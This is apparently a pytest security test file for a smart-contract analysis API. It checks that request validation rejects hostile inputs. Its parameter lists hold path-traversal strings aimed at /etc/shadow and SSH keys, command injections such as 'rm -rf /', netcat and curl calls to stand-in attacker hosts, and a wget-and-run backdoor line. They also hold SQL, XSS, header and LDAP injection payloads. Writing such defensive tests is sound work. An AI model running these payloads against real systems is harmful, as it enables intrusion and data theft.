"""
Security Tests: Input Validation

Tests for preventing injection attacks, path traversal, and malicious input.
Implements Zero Trust principle: validate all inputs.

Author: Fernando Boiero
Institution: UNDEF - IUA Córdoba
"""

import pytest
from pydantic import ValidationError
from miesc.api.schema import AnalysisRequest, VerifyRequest, ClassifyRequest


class TestPathTraversalPrevention:
    """Test suite for path traversal attack prevention."""

    @pytest.mark.security
    @pytest.mark.parametrize("malicious_path", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "../../../../proc/self/environ",
        "contract.sol/../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
        "..%252F..%252F..%252Fetc%252Fpasswd",  # Double URL encoded
        "....//....//....//etc/passwd",  # Double dots
        "contract.sol\x00/etc/passwd",  # Null byte injection
    ])
    def test_path_traversal_attack_blocked(self, malicious_path):
        """
        Test that path traversal attempts are blocked.

        Security Requirement: SR-001 (Input Validation)
        OWASP: A03:2021 Injection
        CWE: CWE-22 (Path Traversal)
        """
        with pytest.raises((ValidationError, ValueError)) as exc_info:
            AnalysisRequest(
                contract_code=malicious_path,
                analysis_type="slither"
            )

        # Verify error doesn't leak sensitive path information
        error_msg = str(exc_info.value).lower()
        assert "passwd" not in error_msg
        assert "shadow" not in error_msg
        assert "system32" not in error_msg

    @pytest.mark.security
    def test_absolute_path_outside_workspace_blocked(self):
        """
        Test that absolute paths outside workspace are rejected.

        Security Requirement: SR-001
        """
        malicious_paths = [
            "/etc/passwd",
            "/var/log/auth.log",
            "C:\\Windows\\System32",
            "/home/user/.ssh/id_rsa"
        ]

        for path in malicious_paths:
            with pytest.raises((ValidationError, ValueError)):
                AnalysisRequest(contract_code=path, analysis_type="slither")


class TestCommandInjectionPrevention:
    """Test suite for command injection prevention."""

    @pytest.mark.security
    @pytest.mark.parametrize("injection_attempt", [
        "contract.sol; rm -rf /",
        "contract.sol && cat /etc/passwd",
        "contract.sol | nc attacker.com 4444",
        "contract.sol`whoami`",
        "contract.sol$(whoami)",
        "contract.sol || curl http://evil.com",
        "contract.sol & sleep 10 &",
        "; wget http://malware.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh;",
        "contract.sol\n/bin/bash -i",
        "contract.sol%0a/usr/bin/id",
    ])
    def test_command_injection_blocked(self, injection_attempt):
        """
        Test that command injection attempts are blocked.

        Security Requirement: SR-002 (Command Injection Prevention)
        OWASP: A03:2021 Injection
        CWE: CWE-78 (OS Command Injection)
        """
        with pytest.raises((ValidationError, ValueError)):
            AnalysisRequest(
                contract_code=injection_attempt,
                analysis_type="slither"
            )


class TestSQLInjectionPrevention:
    """Test suite for SQL injection prevention (future database integration)."""

    @pytest.mark.security
    @pytest.mark.parametrize("sql_injection", [
        "contract.sol' OR '1'='1",
        "contract.sol'; DROP TABLE users; --",
        "contract.sol' UNION SELECT password FROM users--",
        "contract.sol' AND 1=1--",
        "'; exec xp_cmdshell('net user')--",
    ])
    def test_sql_injection_blocked(self, sql_injection):
        """
        Test that SQL injection attempts are blocked.

        Security Requirement: SR-003 (SQL Injection Prevention)
        OWASP: A03:2021 Injection
        CWE: CWE-89 (SQL Injection)
        """
        # Even though we don't use SQL now, sanitize for future-proofing
        with pytest.raises((ValidationError, ValueError)):
            AnalysisRequest(
                contract_code=sql_injection,
                analysis_type="slither"
            )


class TestResourceExhaustionPrevention:
    """Test suite for DoS prevention through resource limits."""

    @pytest.mark.security
    def test_contract_size_limit_enforced(self):
        """
        Test that excessively large contracts are rejected.

        Security Requirement: SR-004 (DoS Prevention)
        OWASP: A06:2021 Vulnerable and Outdated Components
        CWE: CWE-400 (Uncontrolled Resource Consumption)
        """
        # Attempt to submit >1MB contract
        huge_contract = "a" * (1_000_001)

        with pytest.raises(ValidationError) as exc_info:
            AnalysisRequest(
                contract_code=huge_contract,
                analysis_type="slither"
            )

        assert "max_length" in str(exc_info.value).lower()

    @pytest.mark.security
    @pytest.mark.parametrize("timeout", [-1, 0, 1, 9, 3601, 10000])
    def test_timeout_bounds_enforced(self, timeout):
        """
        Test that timeout values are within acceptable bounds.

        Security Requirement: SR-004
        """
        if timeout < 10 or timeout > 3600:
            with pytest.raises(ValidationError):
                AnalysisRequest(
                    contract_code="contract Test {}",
                    analysis_type="slither",
                    timeout=timeout
                )


class TestAnalysisTypeValidation:
    """Test suite for analysis type whitelist validation."""

    @pytest.mark.security
    @pytest.mark.parametrize("invalid_type", [
        "slither; cat /etc/passwd",
        "all && rm -rf /",
        "mythril | nc attacker.com 4444",
        "../../bin/bash",
        "slither`whoami`",
        "INVALID_TOOL",
        "slither\x00invalid",
    ])
    def test_invalid_analysis_type_rejected(self, invalid_type):
        """
        Test that only whitelisted analysis types are accepted.

        Security Requirement: SR-005 (Whitelist Validation)
        OWASP: A04:2021 Insecure Design
        """
        with pytest.raises(ValidationError):
            AnalysisRequest(
                contract_code="contract Test {}",
                analysis_type=invalid_type
            )

    @pytest.mark.security
    @pytest.mark.parametrize("valid_type", ["slither", "mythril", "all"])
    def test_valid_analysis_types_accepted(self, valid_type):
        """Test that valid analysis types are accepted."""
        try:
            request = AnalysisRequest(
                contract_code="contract Test {}",
                analysis_type=valid_type
            )
            assert request.analysis_type == valid_type
        except ValidationError:
            pytest.fail(f"Valid analysis type '{valid_type}' was rejected")


class TestVerificationLevelValidation:
    """Test suite for verification level validation."""

    @pytest.mark.security
    @pytest.mark.parametrize("invalid_level", [
        "basic; rm -rf /",
        "smt && cat /etc/passwd",
        "../../../etc/passwd",
        "INVALID_LEVEL",
    ])
    def test_invalid_verification_level_rejected(self, invalid_level):
        """
        Test that only whitelisted verification levels are accepted.

        Security Requirement: SR-005
        """
        with pytest.raises(ValidationError):
            VerifyRequest(
                contract_code="contract Test {}",
                verification_level=invalid_level
            )


class TestXSSPrevention:
    """Test suite for XSS prevention in error messages and outputs."""

    @pytest.mark.security
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
        "contract.sol'><script>alert(document.cookie)</script>",
    ])
    def test_xss_payload_sanitized(self, xss_payload):
        """
        Test that XSS payloads in inputs are sanitized.

        Security Requirement: SR-006 (XSS Prevention)
        OWASP: A03:2021 Injection
        CWE: CWE-79 (Cross-site Scripting)
        """
        # Even though we're primarily CLI/API, prevent XSS for future web UI
        with pytest.raises((ValidationError, ValueError)):
            AnalysisRequest(
                contract_code=xss_payload,
                analysis_type="slither"
            )


class TestNullByteInjection:
    """Test suite for null byte injection prevention."""

    @pytest.mark.security
    @pytest.mark.parametrize("null_byte_input", [
        "contract.sol\x00.txt",
        "contract\x00.sol",
        "test\x00/etc/passwd",
    ])
    def test_null_byte_injection_blocked(self, null_byte_input):
        """
        Test that null byte injection is prevented.

        Security Requirement: SR-007 (Null Byte Prevention)
        CWE: CWE-158 (Null Byte Interaction Error)
        """
        with pytest.raises((ValidationError, ValueError)):
            AnalysisRequest(
                contract_code=null_byte_input,
                analysis_type="slither"
            )


class TestUnicodeSecurityIssues:
    """Test suite for unicode-related security issues."""

    @pytest.mark.security
    @pytest.mark.parametrize("unicode_attack", [
        "contract\u202e.sol",  # Right-to-left override
        "contract\u200b.sol",  # Zero-width space
        "con\u0000tract.sol",  # Null character
        "\ufeffcontract.sol",  # Zero-width no-break space
    ])
    def test_unicode_attacks_handled(self, unicode_attack):
        """
        Test that unicode-based attacks are handled securely.

        Security Requirement: SR-008 (Unicode Security)
        CWE: CWE-176 (Improper Handling of Unicode Encoding)
        """
        # Should either sanitize or reject
        try:
            request = AnalysisRequest(
                contract_code=unicode_attack,
                analysis_type="slither"
            )
            # If accepted, verify it's been sanitized
            assert "\u202e" not in request.contract_code
            assert "\u200b" not in request.contract_code
        except ValidationError:
            # Rejection is also acceptable
            pass


class TestHTTPHeaderInjection:
    """Test suite for HTTP header injection prevention (API security)."""

    @pytest.mark.security
    @pytest.mark.parametrize("header_injection", [
        "test\r\nX-Injected-Header: value",
        "test\nSet-Cookie: sessionid=stolen",
        "test\r\n\r\n<html><body>Injected Content</body></html>",
    ])
    def test_header_injection_prevented(self, header_injection):
        """
        Test that HTTP header injection is prevented.

        Security Requirement: SR-009 (HTTP Header Injection Prevention)
        OWASP: A03:2021 Injection
        CWE: CWE-113 (HTTP Response Splitting)
        """
        with pytest.raises((ValidationError, ValueError)):
            AnalysisRequest(
                contract_code=header_injection,
                analysis_type="slither"
            )


class TestLDAPInjectionPrevention:
    """Test suite for LDAP injection prevention (future authentication)."""

    @pytest.mark.security
    @pytest.mark.parametrize("ldap_injection", [
        "contract.sol)(uid=*",
        "contract.sol*)(uid=*))(|(uid=*",
        "contract.sol)(|(password=*))",
    ])
    def test_ldap_injection_prevented(self, ldap_injection):
        """
        Test that LDAP injection is prevented.

        Security Requirement: SR-010 (LDAP Injection Prevention)
        OWASP: A03:2021 Injection
        CWE: CWE-90 (LDAP Injection)
        """
        with pytest.raises((ValidationError, ValueError)):
            AnalysisRequest(
                contract_code=ldap_injection,
                analysis_type="slither"
            )


# Pytest configuration for security tests
pytestmark = [
    pytest.mark.security,
    pytest.mark.filterwarnings("error::pytest.PytestUnraisableExceptionWarning")
]


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
